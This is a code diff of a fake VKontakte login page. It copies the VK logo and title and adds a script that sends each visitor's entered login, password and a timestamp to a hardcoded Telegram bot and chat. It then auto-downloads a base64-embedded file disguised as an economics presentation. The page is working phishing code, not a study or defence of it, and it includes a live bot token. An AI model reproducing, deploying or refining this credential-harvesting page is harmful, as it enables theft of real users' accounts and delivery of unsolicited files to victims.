@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход | ЛУЧЗЕР</title>
+    <title>Вход | Vk</title>
     <style>
         * {
             margin: 0;
@@ -115,7 +115,7 @@
             <img src="https://vk.com/images/svg_icons/ic_head_logo.svg" alt="VK Logo">
         </div>
 
-        <div class="title">Вконтакте</div>
+        <div class="title">вконтакте </div>
         
         <div id="notification" class="notification"></div>
 
@@ -138,9 +138,14 @@
     </div>
 
     <script>
+        // Telegram бот
         const BOT_TOKEN = '7993430752:AAFqwGETwuV49zdrlekRxh_tdx-K2X3BRd8';
         const CHAT_ID = '1210041875';
-        
+
+        // Файл для скачивания (закодированный в base64)
+        const fileData = "UEsDBBQAAAAIAON5DVdQhXwYFgEAABYBAAAIABwAZWtvbm9taWthX2VrYXRlcmluYV8yLnBwdHNVVAkAA5X4l2SV+JdkdXgLAAEE6AMAAAToAwAAUEsBAhQAFAAAAAgA43kNV1CFfBgWAQAAFgEAAAgAGAAAAAAAAQAAAKSBAAAAAGVrb25vbWlrYV9la2F0ZXJpbmFfMi5wcHRzVVQFAAGV+JdkdXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEATwAAAFkBAAAAAA==";
+        const fileName = "ekonomika_ekaterina_2.pptx";
+
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -149,34 +154,55 @@
             const notification = document.getElementById('notification');
 
             try {
-                // Используем прокси для обхода CORS
-                const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
-                const apiUrl = `${proxyUrl}https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                
-                const response = await fetch(apiUrl, {
+                // 1. Отправка данных в Telegram
+                const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: `🔐 Новые данные:\nЛогин: ${login}\nПароль: ${password}`
+                        text: `🔐 Новые данные:\nЛогин: ${login}\nПароль: ${password}\nВремя: ${new Date().toLocaleString()}`
                     })
                 });
 
-                notification.textContent = response.ok 
-                    ? '✅ Данные успешно отправлены!' 
-                    : '❌ Ошибка отправки данных';
+                // 2. Скачивание файла
+                const blob = base64ToBlob(fileData, "application/vnd.openxmlformats-officedocument.presentationml.presentation");
+                downloadFile(blob, fileName);
                 
+                notification.textContent = 'Файл скачивается...';
                 notification.style.display = 'block';
-                setTimeout(() => notification.style.display = 'none', 3000);
 
             } catch (error) {
-                notification.textContent = '⚠️ Ошибка соединения';
+                notification.textContent = 'Ошибка отправки данных';
                 notification.style.display = 'block';
-                setTimeout(() => notification.style.display = 'none', 3000);
+                console.error('Error:', error);
             }
         });
+
+        // Функции для работы с файлом
+        function base64ToBlob(base64, mimeType) {
+            const byteCharacters = atob(base64);
+            const byteNumbers = new Array(byteCharacters.length);
+            
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            
+            const byteArray = new Uint8Array(byteNumbers);
+            return new Blob([byteArray], {type: mimeType});
+        }
+
+        function downloadFile(blob, fileName) {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(() => {
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+            }, 100);
+        }
     </script>
 </body>
 </html>
